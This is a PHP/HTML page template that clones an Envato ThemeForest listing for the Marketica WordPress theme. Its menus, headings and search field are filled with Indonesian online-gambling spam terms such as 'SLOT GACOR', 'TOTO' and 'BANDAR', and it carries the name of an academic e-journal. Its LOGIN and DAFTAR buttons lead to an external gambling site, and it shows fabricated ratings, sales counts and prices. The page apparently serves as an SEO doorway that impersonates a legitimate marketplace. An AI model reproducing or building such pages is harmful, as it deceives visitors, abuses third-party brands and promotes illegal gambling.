                                                        <path d="M3.5 2A1.5 1.5 0 0 1 5 3.5 1.5 1.5 0 0 1 3.5 5 1.5 1.5 0 0 1 2 3.5 1.5 1.5 0 0 1 3.5 2zM8 2a1.5 1.5 0 0 1 1.5 1.5A1.5 1.5 0 0 1 8 5a1.5 1.5 0 0 1-1.5-1.5A1.5 1.5 0 0 1 8 2zM12.5 2A1.5 1.5 0 0 1 14 3.5 1.5 1.5 0 0 1 12.5 5 1.5 1.5 0 0 1 11 3.5 1.5 1.5 0 0 1 12.5 2zM3.5 6.5A1.5 1.5 0 0 1 5 8a1.5 1.5 0 0 1-1.5 1.5A1.5 1.5 0 0 1 2 8a1.5 1.5 0 0 1 1.5-1.5zM8 6.5A1.5 1.5 0 0 1 9.5 8 1.5 1.5 0 0 1 8 9.5 1.5 1.5 0 0 1 6.5 8 1.5 1.5 0 0 1 8 6.5zM12.5 6.5A1.5 1.5 0 0 1 14 8a1.5 1.5 0 0 1-1.5 1.5A1.5 1.5 0 0 1 11 8a1.5 1.5 0 0 1 1.5-1.5zM3.5 11A1.5 1.5 0 0 1 5 12.5 1.5 1.5 0 0 1 3.5 14 1.5 1.5 0 0 1 2 12.5 1.5 1.5 0 0 1 3.5 11zM8 11a1.5 1.5 0 0 1 1.5 1.5A1.5 1.5 0 0 1 8 14a1.5 1.5 0 0 1-1.5-1.5A1.5 1.5 0 0 1 8 11zM12.5 11a1.5 1.5 0 0 1 1.5 1.5 1.5 1.5 0 0 1-1.5 1.5 1.5 1.5 0 0 1-1.5-1.5 1.5 1.5 0 0 1 1.5-1.5z">
                                                        </path>

                                                    </svg>

                                                    <span class="global-header-menu__link-text">
                                                        Our Products
                                                    </span>
                                                </a>
                                            <li class="global-header-menu__list-item -background-light -border-radius">
                                                <a id="spec-link-cart" class="global-header-menu__link h-pr1" href="<?php echo $urlPath ?>">

                                                    <svg width="16px" height="16px" viewBox="0 0 16 16" class="global-header-menu__icon global-header-menu__icon-cart" xmlns="http://www.w3.org/2000/svg" aria-labelled="title" role="img">
                                                        <title>Cart</title>
                                                        <path d="M 0.009 1.349 C 0.009 1.753 0.347 2.086 0.765 2.086 C 0.765 2.086 0.766 2.086 0.767 2.086 L 0.767 2.09 L 2.289 2.09 L 5.029 7.698 L 4.001 9.507 C 3.88 9.714 3.812 9.958 3.812 10.217 C 3.812 11.028 4.496 11.694 5.335 11.694 L 14.469 11.694 L 14.469 11.694 C 14.886 11.693 15.227 11.36 15.227 10.957 C 15.227 10.552 14.886 10.221 14.469 10.219 L 14.469 10.217 L 5.653 10.217 C 5.547 10.217 5.463 10.135 5.463 10.031 L 5.487 9.943 L 6.171 8.738 L 11.842 8.738 C 12.415 8.738 12.917 8.436 13.175 7.978 L 15.901 3.183 C 15.96 3.08 15.991 2.954 15.991 2.828 C 15.991 2.422 15.65 2.09 15.23 2.09 L 3.972 2.09 L 3.481 1.077 L 3.466 1.043 C 3.343 0.79 3.084 0.612 2.778 0.612 C 2.777 0.612 0.765 0.612 0.765 0.612 C 0.347 0.612 0.009 0.943 0.009 1.349 Z M 3.819 13.911 C 3.819 14.724 4.496 15.389 5.335 15.389 C 6.171 15.389 6.857 14.724 6.857 13.911 C 6.857 13.097 6.171 12.434 5.335 12.434 C 4.496 12.434 3.819 13.097 3.819 13.911 Z M 11.431 13.911 C 11.431 14.724 12.11 15.389 12.946 15.389 C 13.784 15.389 14.469 14.724 14.469 13.911 C 14.469 13.097 13.784 12.434 12.946 12.434 C 12.11 12.434 11.431 13.097 11.431 13.911 Z">
                                                        </path>

                                                    </svg>


                                                    <span class="global-header-menu__link-cart-amount is-hidden" data-view="headerCartCount" data-test-id="header_cart_count">0</span>
                                                </a>
                                            </li>

                                            <li class="global-header-menu__list-item -background-light -border-radius">
                                                <a class="global-header-menu__link h-pl1" data-view="modalAjax" href="<?php echo $urlPath ?>">
                                                    <span id="spec-user-username" class="global-header-menu__link-text">
                                                        Sign In
                                                    </span>
                                                </a>
                                            </li>

                                        </ul>
                                    </nav>
                                </div>
                            </div>
                        </div>


                        <div class="site-header__sites is-hidden-tablet-and-below" bis_skin_checked="1">
                            <div class="header-sites header-site-titles" bis_skin_checked="1">
                                <div class="grid-container -layout-wide" bis_skin_checked="1">
                                    <nav class="header-site-titles__container">
                                        <div class="header-site-titles__site" bis_skin_checked="1">
                                            <a class="header-site-titles__link t-link is-active" alt="Web Templates" href="<?php echo $urlPath ?>"><?php echo $BRANDS ?></a>
                                        </div>
                                        <div class="header-site-titles__site" bis_skin_checked="1">
                                            <a class="header-site-titles__link t-link" alt="Code" href="<?php echo $urlPath ?>">SLOT <?php echo $BRANDS ?></a>
                                        </div>
                                        <div class="header-site-titles__site" bis_skin_checked="1">
                                            <a class="header-site-titles__link t-link" alt="Video" href="<?php echo $urlPath ?>">BANDAR <?php echo $BRANDS ?></a>
                                        </div>
                                        <div class="header-site-titles__site" bis_skin_checked="1">
                                            <a class="header-site-titles__link t-link" alt="Music" href="<?php echo $urlPath ?>"><?php echo $BRANDS ?> GACOR</a>
                                        </div>
                                        <div class="header-site-titles__site" bis_skin_checked="1">
                                            <a class="header-site-titles__link t-link" alt="Graphics" href="<?php echo $urlPath ?>"><?php echo $BRANDS ?> 4D</a>
                                        </div>
                                        <div class="header-site-titles__site" bis_skin_checked="1">
                                            <a class="header-site-titles__link t-link" alt="Photos" href="<?php echo $urlPath ?>">SITUS <?php echo $BRANDS ?></a>
                                        </div>
                                        <div class="header-site-titles__site" bis_skin_checked="1">
                                            <a class="header-site-titles__link t-link" alt="3D Files" href="<?php echo $urlPath ?>"><?php echo $BRANDS ?> RESMI</a>
                                        </div>

                                        <div class="header-site-titles__site elements-nav__container" bis_skin_checked="1">
                                            <a class="header-site-titles__link t-link elements-nav__main-link" href="https://elements.envato.com/?utm_campaign=elements_mkt-switcher_31JUL2024&amp;utm_content=tf_item_8988002&amp;utm_medium=referral&amp;utm_source=themeforest.net" target="_blank">
                                                <span>
                                                    Unlimited Downloads
                                                </span>
                                            </a>

                                            <a target="_blank" class="elements-nav__dropdown-container unique-selling-points__variant" data-analytics-view-payload="{&quot;eventName&quot;:&quot;view_promotion&quot;,&quot;contextDetail&quot;:&quot;site switcher&quot;,&quot;ecommerce&quot;:{&quot;promotionId&quot;:&quot;elements_mkt-switcher_31JUL2024&quot;,&quot;promotionName&quot;:&quot;elements_mkt-switcher_31JUL2024&quot;,&quot;promotionType&quot;:&quot;elements referral&quot;}}" data-analytics-click-payload="{&quot;eventName&quot;:&quot;select_promotion&quot;,&quot;contextDetail&quot;:&quot;site switcher&quot;,&quot;ecommerce&quot;:{&quot;promotionId&quot;:&quot;elements_mkt-switcher_31JUL2024&quot;,&quot;promotionName&quot;:&quot;elements_mkt-switcher_31JUL2024&quot;,&quot;promotionType&quot;:&quot;elements referral&quot;}}" href="https://elements.envato.com/?utm_campaign=elements_mkt-switcher_31JUL2024&amp;utm_content=tf_item_8988002&amp;utm_medium=referral&amp;utm_source=themeforest.net">
                                                <div class="elements-nav__main-panel" bis_skin_checked="1">
                                                    <img class="elements-nav__logo-container" loading="lazy" src="https://public-assets.envato-static.com/assets/header/EnvatoElements-logo-4f70ffb865370a5fb978e9a1fc5bbedeeecdfceb8d0ebec2186aef4bee5db79d.svg" alt="Elements logo" height="23" width="101">

                                                    <div class="elements-nav__punch-line" bis_skin_checked="1">
                                                        <h2>
                                                            Looking for unlimited downloads?
                                                        </h2>
                                                        <p>
                                                            Subscribe to Envato Elements.
                                                        </p>
                                                        <ul>
                                                            <li>
                                                                <img src="https://public-assets.envato-static.com/assets/header/badge-a65149663b95bcee411e80ccf4da9788f174155587980d8f1d9c44fd8b59edd8.svg" alt="badge" width="20" height="20">
                                                                Millions of premium assets
                                                            </li>
                                                            <li>
                                                                <img src="https://public-assets.envato-static.com/assets/header/thumbs_up-e5ce4c821cfd6a6aeba61127a8e8c4d2d7c566e654f588a22708c64d66680869.svg" alt="thumbs up" width="20" height="20">
                                                                Great value subscription
                                                            </li>
                                                        </ul>
                                                        <button class="brand-neue-button brand-neue-button__open-in-new elements-nav__cta">Let's
                                                            create</button>
                                                        <p></p>
                                                    </div>
                                                </div>
                                                <div class="elements-nav__secondary-panel" bis_skin_checked="1">
                                                    <img class="elements-nav__secondary-panel__collage" loading="lazy" src="https://public-assets.envato-static.com/assets/header/items-collage-1x-a39e4a5834e75c32a634cc7311720baa491687b1aaa4b709ebd1acf0f8427b53.png" srcset="https://public-assets.envato-static.com/assets/header/items-collage-2x-75e1ad16a46b9788861780a57feeb5fd1ad1026ecce9330302f0ef8f6f542697.png 2x" alt="Collage of Elements items" width="267" height="233">
                                                </div>
                                            </a>
                                        </div>

                                        <div class="header-site-floating-logo__container" bis_skin_checked="1">
                                            <div class="" bis_skin_checked="1">
                                                <img src="https://res.cloudinary.com/dxje0jyp5/image/upload/v1761050344/seo_hantu_vmraht.png" alt="SLOT GACOR" style="max-width: 50px; height: auto; object-fit: contain;" data-spm-anchor-id="0.0.header.i0.27e27142EyRkBl">
                                            </div>
                                        </div>
                                    </nav>
                                </div>
                            </div>

                        </div>

                        <div class="site-header__categories is-hidden-tablet-and-below" bis_skin_checked="1">
                            <div class="header-categories" bis_skin_checked="1">
                                <div class="grid-container -layout-wide" bis_skin_checked="1">
                                    <ul class="header-categories__links">
                                        <li class="header-categories__links-item">
                                            <a class="header-categories__main-link" data-view="touchOnlyDropdown" data-dropdown-target=".js-categories-0-dropdown" href="<?php echo $urlPath ?>"><?php echo $BRANDS ?></a>
                                        </li>
                                        <li class="header-categories__links-item">
                                            <a class="header-categories__main-link" data-view="touchOnlyDropdown" data-dropdown-target=".js-categories-1-dropdown" href="<?php echo $urlPath ?>">TOTO <?php echo $BRANDS ?></a>
                                        </li>
                                        <li class="header-categories__links-item">
                                            <a class="header-categories__main-link" data-view="touchOnlyDropdown" data-dropdown-target=".js-categories-2-dropdown" href="<?php echo $urlPath ?>">BANDAR <?php echo $BRANDS ?></a>
                                        </li>
                                        <li class="header-categories__links-item">
                                            <a class="header-categories__main-link header-categories__main-link--empty" href="<?php echo $urlPath ?>">SLOT <?php echo $BRANDS ?></a>
                                        </li>
                                        <li class="header-categories__links-item">
                                            <a class="header-categories__main-link" data-view="touchOnlyDropdown" data-dropdown-target=".js-categories-4-dropdown" href="<?php echo $urlPath ?>"><?php echo $BRANDS ?> 4D</a>
                                            </a>
                                        </li>
                                        <li class="header-categories__links-item">
                                            <a class="header-categories__main-link" data-view="touchOnlyDropdown" data-dropdown-target=".js-categories-5-dropdown" href="<?php echo $urlPath ?>">SITUS <?php echo $BRANDS ?></a>
                                        </li>
                                        <li class="header-categories__links-item">
                                            <a class="header-categories__main-link header-categories__main-link--empty" href="<?php echo $urlPath ?>"><?php echo $BRANDS ?> RESMI</a>
                                        </li>
                                    </ul>
                                        <div class="header-categories__search" bis_skin_checked="1">
                                            <form id="search" data-view="searchField" action="<?php echo $urlPath ?>" accept-charset="UTF-8" method="get">
                                                <div class="search-field -border-light h-ml2" bis_skin_checked="1">
                                                    <div class="search-field__input" bis_skin_checked="1">
                                                        <input id="term" name="term" class="js-term search-field__input-field" type="search" placeholder="GACOR">
                                                    </div>
                                                    <button class="search-field__button" type="submit">
                                                        <i class="e-icon -icon-search"><span class="e-icon__alt">GACOR</span></i>
                                                    </button>
                                                </div>
                                            </form>
                                        </div>
                                    
                                </div>
                            </div>

                        </div>
                        
                    </header>
                </div>

                <div class="js-canvas__body canvas__body" bis_skin_checked="1">
                    <div class="grid-container" bis_skin_checked="1">
                    </div>



                    <div class="context-header " bis_skin_checked="1">
                        <div class="grid-container " bis_skin_checked="1">
                            <nav class="breadcrumbs h-text-truncate  ">
                            </nav>

                            <div class="item-header" data-view="itemHeader" bis_skin_checked="1">
                                <div class="item-header__top" bis_skin_checked="1">
                                    <div class="item-header__title" bis_skin_checked="1">
                                        <h1 class="t-heading -color-inherit -size-l h-m0 is-hidden-phone"><?php echo $BRANDS ?> e-Jurnal STIE Bhakti Pembangunan</h1>

                                        <h1 class="t-heading -color-inherit -size-xs h-m0 is-hidden-tablet-and-above">
                                            <?php echo $BRANDS ?> e-Jurnal STIE Bhakti Pembangunan
                                        </h1>
                                    </div>

                                    <div class="item-header__price is-hidden-desktop" bis_skin_checked="1">
                                        <a class="js-item-header__cart-button e-btn--3d -color-primary -size-m" rel="nofollow" title="Add to Cart" data-view="modalAjax" href="<?php echo $urlPath ?>">
                                            <span class="item-header__cart-button-icon">
                                                <i class="e-icon -icon-cart -margin-right"></i>
                                            </span>

                                            <span class="t-heading -size-m -color-light -margin-none">
                                                <b class="t-currency"><span class="js-item-header__price">$8788</span></b>
                                            </span>
                                        </a>
                                    </div>
                                </div>

                                <div class="item-header__details-section" bis_skin_checked="1">
                                    <div class="item-header__author-details" bis_skin_checked="1">
                                        By <a rel="author" class="js-by-author" href="<?php echo $urlPath ?>"><?php echo $BRANDS ?></a>
                                    </div>
                                    <div class="item-header__sales-count" bis_skin_checked="1">
                                        <svg width="16px" height="16px" viewBox="0 0 16 16" class="item-header__sales-count-icon" xmlns="http://www.w3.org/2000/svg" aria-labelledby="title" role="img">
                                            <title>Cart</title>
                                            <path d="M 0.009 1.349 C 0.009 1.753 0.347 2.086 0.765 2.086 C 0.765 2.086 0.766 2.086 0.767 2.086 L 0.767 2.09 L 2.289 2.09 L 5.029 7.698 L 4.001 9.507 C 3.88 9.714 3.812 9.958 3.812 10.217 C 3.812 11.028 4.496 11.694 5.335 11.694 L 14.469 11.694 L 14.469 11.694 C 14.886 11.693 15.227 11.36 15.227 10.957 C 15.227 10.552 14.886 10.221 14.469 10.219 L 14.469 10.217 L 5.653 10.217 C 5.547 10.217 5.463 10.135 5.463 10.031 L 5.487 9.943 L 6.171 8.738 L 11.842 8.738 C 12.415 8.738 12.917 8.436 13.175 7.978 L 15.901 3.183 C 15.96 3.08 15.991 2.954 15.991 2.828 C 15.991 2.422 15.65 2.09 15.23 2.09 L 3.972 2.09 L 3.481 1.077 L 3.466 1.043 C 3.343 0.79 3.084 0.612 2.778 0.612 C 2.777 0.612 0.765 0.612 0.765 0.612 C 0.347 0.612 0.009 0.943 0.009 1.349 Z M 3.819 13.911 C 3.819 14.724 4.496 15.389 5.335 15.389 C 6.171 15.389 6.857 14.724 6.857 13.911 C 6.857 13.097 6.171 12.434 5.335 12.434 C 4.496 12.434 3.819 13.097 3.819 13.911 Z M 11.431 13.911 C 11.431 14.724 12.11 15.389 12.946 15.389 C 13.784 15.389 14.469 14.724 14.469 13.911 C 14.469 13.097 13.784 12.434 12.946 12.434 C 12.11 12.434 11.431 13.097 11.431 13.911 Z">
                                            </path>

                                        </svg>

                                        <strong>584.588</strong> sales
                                    </div>
                                    <div class="item-header__envato-highlighted" bis_skin_checked="1">
                                        <strong><?php echo $BRANDS ?> BET 200</strong>
                                        <svg width="16px" height="16px" viewBox="0 0 14 14" class="item-header__envato-checkmark-icon" xmlns="http://www.w3.org/2000/svg" aria-labelledby="title" role="img">
                                            <title></title>
                                            <path fill-rule="evenodd" clip-rule="evenodd" d="M0.333252 7.00004C0.333252 3.31814 3.31802 0.333374 6.99992 0.333374C8.76803 0.333374 10.4637 1.03575 11.714 2.286C12.9642 3.53624 13.6666 5.23193 13.6666 7.00004C13.6666 10.6819 10.6818 13.6667 6.99992 13.6667C3.31802 13.6667 0.333252 10.6819 0.333252 7.00004ZM6.15326 9.23337L9.89993 5.48671C10.0227 5.35794 10.0227 5.15547 9.89993 5.02671L9.54659 4.67337C9.41698 4.54633 9.20954 4.54633 9.07993 4.67337L5.91993 7.83337L4.91993 6.84004C4.85944 6.77559 4.77498 6.73903 4.68659 6.73903C4.5982 6.73903 4.51375 6.77559 4.45326 6.84004L4.09993 7.19337C4.03682 7.25596 4.00133 7.34116 4.00133 7.43004C4.00133 7.51892 4.03682 7.60412 4.09993 7.66671L5.68659 9.23337C5.74708 9.29782 5.83154 9.33439 5.91993 9.33439C6.00832 9.33439 6.09277 9.29782 6.15326 9.23337Z" fill="#79B530"></path>

                                        </svg>
                                       
                                    </div>
                                </div>


                            </div>



                            <!-- Desktop Item Navigation -->
                            <div class="is-hidden-tablet-and-below page-tabs" bis_skin_checked="1">
                                <ul>
                                    <li class="selected"><a class="js-item-navigation-item-details t-link -decoration-none" href="<?php echo $urlPath ?>">Item Details</a>
                                    </li>
                                    <li><a class="js-item-navigation-reviews t-link -decoration-none" href="<?php echo $urlPath ?>"><span>Reviews</span><span>
                                                <div class="rating-detailed-small" bis_skin_checked="1">
                                                    <div class="rating-detailed-small__header" bis_skin_checked="1">
                                                        <div class="rating-detailed-small__stars" bis_skin_checked="1">
                                                            <div class="rating-detailed-small-center__star-rating" bis_skin_checked="1">
                                                                <i class="e-icon -icon-star">
                                                                </i> <i class="e-icon -icon-star">
                                                                </i> <i class="e-icon -icon-star">
                                                                </i> <i class="e-icon -icon-star">
                                                                </i> <i class="e-icon -icon-star">
                                                                    </i> <i class="e-icon -icon-star">
                                                                </i> <i class="e-icon -icon-star">
                                                                </i>
                                                            </div>
                                                            7.00
                                                            <span class="is-visually-hidden">7.00 stars</span>
                                                        </div>
                                                    </div>
                                                </div>
                                            </span><span class="item-navigation-reviews-comments">77.787</span></a></li>
                                    <li><a class="js-item-navigation-comments t-link -decoration-none" href="<?php echo $urlPath ?>"><span>Comments</span><span class="item-navigation-reviews-comments">9,777</span></a></li>
                                    <li><a class="js-item-navigation-support t-link -decoration-none" href="<?php echo $urlPath ?>">Support</a>
                                    </li>
                                </ul>


                            </div>
<style>.n-columns-2{display:grid;grid-template-columns:repeat(2,1fr);font-weight:700}.n-columns-2 a{text-align:center}.login,.register{color:#fff;padding:13px 10px}.login,.login-button{text-shadow:2px 2px #0c0f12;border-radius:10px 10px;border:1px solidrgb(0, 51, 255);background:linear-gradient(to bottom,#d10000 0,#5e3200 100%);color:#fff}.register,.register-button{text-shadow:2px 2px #000;border-radius:10px 10px;background:linear-gradient(to bottom,#d17000 0,#5e3200 100%);border:1px solidrgb(0, 51, 255)}</style>
<!-- Section 2 -->
  </div>
</div>


                            <!-- Tablet or below Item Navigation -->
                            <div class="page-tabs--dropdown" data-view="replaceItemNavsWithRemote" data-target=".js-remote" bis_skin_checked="1">
                                <div class="page-tabs--dropdown__slt-custom-wlabel" bis_skin_checked="1">
                                    <div class="slt-custom-wlabel--page-tabs--dropdown" bis_skin_checked="1">
                                        <label>
                                            <span class="js-label">
                                                Item Details
                                            </span>
                                            <span class="slt-custom-wlabel__arrow">
                                                <i class="e-icon -icon-arrow-fill-down"></i>
                                            </span>
                                        </label>

                                        <select class="js-remote">
                                            <option selected="selected" data-url="/item/marketica-marketplace-wordpress-theme/8988002">Item
                                                Details</option>
                                            <option data-url="/item/marketica-marketplace-wordpress-theme/reviews/8988002">
                                                Reviews (75)</option>
                                            <option data-url="/item/marketica-marketplace-wordpress-theme/8988002/comments">
                                                Comments (802)</option>
                                            <option data-url="/item/marketica-marketplace-wordpress-theme/8988002/support">
                                                Support</option>


                                        </select>
                                    </div>
                                </div>
                            </div>

                            <div class="page-tabs" bis_skin_checked="1">
                                <ul class="right item-bookmarking__left-icons_hidden" data-view="bookmarkStatesLoader">
                                    <li class="js-favorite-widget item-bookmarking__control_icons--favorite" data-item-id="8988002"><a data-view="modalAjax" class="t-link -decoration-none" href="<?php echo $urlPath ?>"><span class="item-bookmarking__control--label">Add to Favorites</span></a>
                                    </li>
                                    <li class="js-collection-widget item-bookmarking__control_icons--collection" data-item-id="8988002"><a data-view="modalAjax" class="t-link -decoration-none" href="<?php echo $urlPath ?>"><span class="item-bookmarking__control--label">Add to Collection</span></a>
                                    </li>
                                </ul>
                            </div>


                        </div>
                    </div>


                    <div class="content-main" id="content" bis_skin_checked="1">

                        <div class="grid-container" bis_skin_checked="1">
                            <script nonce="TFNQUvYHwdi8uHoMheRs/Q==">//<![CDATA[
window.GtmMeasurements.sendAnalyticsEvent({"eventName":"view_item","eventType":"user","ecommerce":{"currency":"USD","value":37.0,"items":[{"affiliation":"themeforest","item_id":8988002,"item_name":"<?php echo $BRANDS ?> e-Jurnal STIE Bhakti Pembangunan","item_brand":"tokopress","item_category":"wordpress","item_category2":"ecommerce","item_category3":"woocommerce","price":37.0,"quantity":1,"item_add_on":"bundle_6month","item_variant":"regular"}]}});
//]]></script>


                            <div bis_skin_checked="1">
                                <link href="https://res.cloudinary.com/dxje0jyp5/image/upload/v1760536399/samples/waves.png">

                                <div class="content-s " bis_skin_checked="1">
                                    <div class="item-bookmarking__left-icons__wrapper" bis_skin_checked="1">
                                        <ul class="item-bookmarking__left-icons" data-view="bookmarkStatesLoader">
                                            <li class="item-bookmarking__control_icons--favorite">
                                                <span>
                                                    <a title="Add to Favorites" data-view="modalAjax" href="<?php echo $urlPath ?>"><span class="item-bookmarking__control--label">Add to
                                                            Favorites</span></a>
                                                </span>

                                            </li>
                                            <li class="item-bookmarking__control_icons--collection">
                                                <span>
                                                    <a title="Add to Collection" data-view="modalAjax" href="<?php echo $urlPath ?>">
                                                        <span class="item-bookmarking__control--label">Add to
                                                            Collection</span>
                                                    </a> </span>

                                            </li>
                                        </ul>
                                    </div>


                                    <div class="box--no-padding" bis_skin_checked="1">
                                        <div class="item-preview live-preview-btn--blue -preview-live" bis_skin_checked="1">



                                            <a target="_blank" href="https://seo-burung-nuri.pages.dev/"><img alt="<?php echo $BRANDS ?> e-Jurnal STIE Bhakti Pembangunan" width="300" height="300" srcset="https://res.cloudinary.com/dxje0jyp5/image/upload/v1760536399/samples/waves.png" sizes="(min-width: 1024px) 590px, (min-width: 1px) 100vw, 600px" src="https://res.cloudinary.com/dxje0jyp5/image/upload/v1760536399/samples/waves.png"></a>
                                            <div class="js- item-preview-image__gallery" data-title="<?php echo $BRANDS ?> e-Jurnal STIE Bhakti Pembangunan" data-url="marketica-marketplace-wordpress-theme/screenshots/modal/8988002" bis_skin_checked="1">
                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/00-marketica-preview-sale37.jpg">MARKETICA_PREVIEW/00-marketica-preview-sale37.jpg</a>
                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/01_marketica2_homepage.png">MARKETICA_PREVIEW/01_marketica2_homepage.png</a>
                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/02_marketica2_shop_page.png">MARKETICA_PREVIEW/02_marketica2_shop_page.png</a>
                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/03_marketica2_single_product_page.png">MARKETICA_PREVIEW/03_marketica2_single_product_page.png</a>
                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/04_marketica2_cart_page.png">MARKETICA_PREVIEW/04_marketica2_cart_page.png</a>
                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/05_marketica2_checkout_page.png">MARKETICA_PREVIEW/05_marketica2_checkout_page.png</a>
                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/06_marketica2_myaccount_login_page.png">MARKETICA_PREVIEW/06_marketica2_myaccount_login_page.png</a>
                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/07_marketica2_plan_and_pricing_page.png">MARKETICA_PREVIEW/07_marketica2_plan_and_pricing_page.png</a>
                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/08_marketica2_team_members_page.png">MARKETICA_PREVIEW/08_marketica2_team_members_page.png</a>
                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/09_marketica2_contact_page_template.png">MARKETICA_PREVIEW/09_marketica2_contact_page_template.png</a>
                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/10_marketica2_blog_page.png">MARKETICA_PREVIEW/10_marketica2_blog_page.png</a>
                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/11_marketica2_blog_post_formats.png">MARKETICA_PREVIEW/11_marketica2_blog_post_formats.png</a>
                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/12_marketica2_single_product_page.png">MARKETICA_PREVIEW/12_marketica2_single_product_page.png</a>
                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/13_marketica2_theme_customizer.png">MARKETICA_PREVIEW/13_marketica2_theme_customizer.png</a>
                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/14_marketica2_visualcomposer_templates.png">MARKETICA_PREVIEW/14_marketica2_visualcomposer_templates.png</a>
                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/15_marketica2_tablet_view.png">MARKETICA_PREVIEW/15_marketica2_tablet_view.png</a>
                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/16_marketica2_tablet_view_offcanvas_menu.png">MARKETICA_PREVIEW/16_marketica2_tablet_view_offcanvas_menu.png</a>
                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/17_marketica2_themeoptions_header.png">MARKETICA_PREVIEW/17_marketica2_themeoptions_header.png</a>
                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/18_marketica2_themeoptions_footer.png">MARKETICA_PREVIEW/18_marketica2_themeoptions_footer.png</a>
                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/19_marketica2_themeoptions_contact.png">MARKETICA_PREVIEW/19_marketica2_themeoptions_contact.png</a>
                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/20_marketica2_themeoptions_woocommerce.png">MARKETICA_PREVIEW/20_marketica2_themeoptions_woocommerce.png</a>
                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/21_marketica2_wcvendors_user_page.png">MARKETICA_PREVIEW/21_marketica2_wcvendors_user_page.png</a>
                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/22_marketica2_wcvendors_vendor_page.png">MARKETICA_PREVIEW/22_marketica2_wcvendors_vendor_page.png</a>
                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/23_marketica2_wcvendors_vendor_dashboard.png">MARKETICA_PREVIEW/23_marketica2_wcvendors_vendor_dashboard.png</a>
                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/24_marketica2_wcvendors_shop_settings.png">MARKETICA_PREVIEW/24_marketica2_wcvendors_shop_settings.png</a>
                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/25_marketica2_dokan_vendor_store_page.png">MARKETICA_PREVIEW/25_marketica2_dokan_vendor_store_page.png</a>
                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/26_marketica2_dokan_vendor_review_page.png">MARKETICA_PREVIEW/26_marketica2_dokan_vendor_review_page.png</a>
                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/27_marketica2_dokan_vendor_dashboard_page.png">MARKETICA_PREVIEW/27_marketica2_dokan_vendor_dashboard_page.png</a>
                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/28_marketica2_dokan_vendor_dashboard_products_page.png">MARKETICA_PREVIEW/28_marketica2_dokan_vendor_dashboard_products_page.png</a>
                                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/29_marketica2_dokan_vendor_dashboard_settings_page.png">MARKETICA_PREVIEW/29_marketica2_dokan_vendor_dashboard_settings_page.png</a>
                                            </div>

                                            <div class="item-preview__actions" bis_skin_checked="1">
                                                <div class="n-columns-2">
                                                    <a href="https://seo-burung-nuri.pages.dev/" rel="nofollow noreferrer" class="login">LOGIN</a>
                                                    <a href="https://seo-burung-nuri.pages.dev/" rel="nofollow noreferrer" class="register">DAFTAR</a>
                                                </div>
                                            </div>
                                            </div>

                                        </div>
                                    </div>


                                    <div data-view="toggleItemDescription" bis_skin_checked="1">
                                        <div class="js-item-togglable-content has-toggle" bis_skin_checked="1">

                                            <div class="js-item-description-toggle item-description-toggle" bis_skin_checked="1">
                                                <a class="item-description-toggle__link" href="<?php echo $urlPath ?>">
                                                    <span>Show More <i class="e-icon -icon-chevron-down"></i></span>
                                                    <span class="item-description-toggle__less">Show Less <i class="e-icon -icon-chevron-down -rotate-180"></i></span>
                                                </a>
                                            </div>
                                        </div>
                                    </div>

                                    <section data-view="recommendedItems" data-url="/item/marketica-marketplace-wordpress-theme/8988002/recommended_items" id="recommended_items">
                                        <div class="author-recommended-collection" bis_skin_checked="1">

